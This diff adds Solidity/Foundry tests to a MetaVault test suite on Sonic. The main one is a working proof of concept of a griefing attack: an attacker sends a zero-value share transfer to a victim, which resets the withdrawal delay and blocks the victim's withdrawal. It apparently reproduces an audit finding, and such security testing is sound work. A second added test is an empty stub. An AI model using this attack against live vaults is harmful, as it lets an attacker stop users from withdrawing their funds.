@@ -1425,6 +1425,94 @@ contract MetaVaultSonicTest is Test {
             IERC20(assets[j]).approve(metavault, amounts[j]);
         }
     }
+
+    //==========================================================
+
+    function test_withdrawal_blocking_griefing_attack() public {
+        // Select the first MetaVault for testing
+        IMetaVault metaVault = IMetaVault(metaVaults[0]);
+        address[] memory assets = metaVault.assetsForDeposit();
+        address usdc = SonicConstantsLib.TOKEN_USDC;
+
+        // Setup accounts
+        address victim = address(0xBEEF);
+        address attacker = address(0xBAD);
+
+        // Label for clearer traces
+        vm.label(victim, "Victim");
+        vm.label(attacker, "Attacker");
+
+        // 1. Victim deposits 1,000 USDC
+        uint victimDepositAmount = 1000 * 10 ** 6; // 1,000 USDC
+        uint[] memory victimAmounts = new uint[](1);
+        victimAmounts[0] = victimDepositAmount;
+
+        deal(usdc, victim, victimDepositAmount);
+        vm.startPrank(victim);
+        IERC20(usdc).approve(address(metaVault), victimDepositAmount);
+        metaVault.depositAssets(assets, victimAmounts, 0, victim);
+        uint victimShares = IERC20(address(metaVault)).balanceOf(victim);
+        vm.stopPrank();
+
+        // 2. Attacker makes a small deposit to get shares
+        uint attackerDepositAmount = 10 * 10 ** 6; // 10 USDC
+        uint[] memory attackerAmounts = new uint[](1);
+        attackerAmounts[0] = attackerDepositAmount;
+
+        deal(usdc, attacker, attackerDepositAmount);
+        vm.startPrank(attacker);
+        IERC20(usdc).approve(address(metaVault), attackerDepositAmount);
+        metaVault.depositAssets(assets, attackerAmounts, 0, attacker);
+        uint attackerShares = IERC20(address(metaVault)).balanceOf(attacker);
+        vm.stopPrank();
+
+        // 3. Roll forward blocks past the withdrawal delay (typically 5 blocks)
+        uint withdrawalDelayBlocks = 5; // This is from the audit
+        vm.roll(block.number + withdrawalDelayBlocks + 1);
+
+        // 4. Attacker executes griefing attack by sending 0 shares to victim
+        vm.prank(attacker);
+        IERC20(address(metaVault)).transfer(victim, 0);
+
+        // 5. Victim tries to withdraw but should fail
+        vm.startPrank(victim);
+        uint[] memory minAmounts = new uint[](1);
+        minAmounts[0] = 0;
+
+        // The withdrawal should revert with WaitAFewBlocks error
+        vm.expectRevert(
+            abi.encodeWithSelector(IStabilityVault.WaitAFewBlocks.selector)
+        );
+        metaVault.withdrawAssets(assets, victimShares, minAmounts);
+        vm.stopPrank();
+
+        // 6. Roll forward again past delay to show victim could withdraw after waiting again
+        vm.roll(block.number + withdrawalDelayBlocks + 1);
+
+        // 7. Now victim should be able to withdraw
+        vm.startPrank(victim);
+        uint victimUsdcBefore = IERC20(usdc).balanceOf(victim);
+        metaVault.withdrawAssets(assets, victimShares, minAmounts);
+        uint victimUsdcAfter = IERC20(usdc).balanceOf(victim);
+        vm.stopPrank();
+
+        // Verify victim could withdraw after waiting
+        uint victimReceived = victimUsdcAfter - victimUsdcBefore;
+        assertGt(
+            victimReceived,
+            0,
+            "Victim should receive funds after waiting again"
+        );
+    }
+
+    //======================================================
+
+    function test_interact_with_wrappedmetaVault() public {
+        IMetaVault metavault = IMetaVault(metaVaults[0]);
+        IPlatform platform  = IPlatform(PLATFORM);
+
+         
+    }
 }
 
 /**
